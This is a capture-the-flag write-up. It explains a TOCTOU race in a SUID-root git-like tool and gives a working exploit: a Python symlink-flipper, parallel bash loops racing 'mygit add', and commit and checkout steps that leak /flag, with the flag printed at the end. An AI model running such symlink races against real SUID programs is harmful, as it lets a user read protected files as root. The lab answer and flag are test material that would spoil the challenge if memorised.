---
title: Grande Inutile Tool
---
# Grande Inutile Tool — Writeup

## Challenge

A custom git-like tool `mygit` is provided.
The binary is **SUID root**, and the flag is stored in `/flag`, which is not directly readable by the user.

---

## Vulnerability

In the `add` command, the function `staging_add()` contains a **TOCTOU race condition**:

```c
realpath(path, resolved_file);   // check
...
object_store(path, hash);        // use
```

* `realpath()` verifies that the file is inside the repository
* `object_store()` later reopens the original path
* The path can be changed between these two operations

This allows reading arbitrary files as root.

---

## Exploit Strategy

1. Create a repository and a normal file `leak`
2. Rapidly replace `leak` between:

   * a safe regular file
   * a symlink to `/flag`
3. Race `mygit add leak` until:

   * `realpath()` sees the safe file
   * `object_store()` reads `/flag`
4. Commit and checkout to materialize the file

Shell utilities are too slow; a Python syscall-based flipper is required.

---

## Exploitation

### Repository setup

```bash
mkdir ~/final
cd ~/final
mygit init

echo DUMMY > safe
echo DUMMY > leak
```

### Fast symlink flipper (Terminal 1)

```bash
python3 - <<'PY'
import os
while True:
    try: os.unlink("leak")
    except FileNotFoundError: pass
    try: os.symlink("safe", "leak")
    except FileExistsError: pass

    try: os.unlink("leak")
    except FileNotFoundError: pass
    try: os.symlink("/flag", "leak")
    except FileExistsError: pass
PY
```

### Race the add (Terminal 2)

```bash
for i in 1 2 3 4 5 6 7 8 9 10 11 12; do
  ( while true; do mygit add leak 2>/dev/null && exit; done ) &
done
wait
```

Stop the flipper as soon as `Added 'leak'` appears.

### Commit and retrieve flag

```bash
mygit commit -m steal
rm -f leak
touch leak
mygit checkout main
cat leak
```

---

## Flag

```
pascalCTF{m4ny_fr13nds_0f_m1n3_h4t3_git_btw}
```

---

## Conclusion

The challenge is solved by exploiting a TOCTOU vulnerability in a SUID binary.
By racing the file path between validation and use, arbitrary file reads as root are possible.
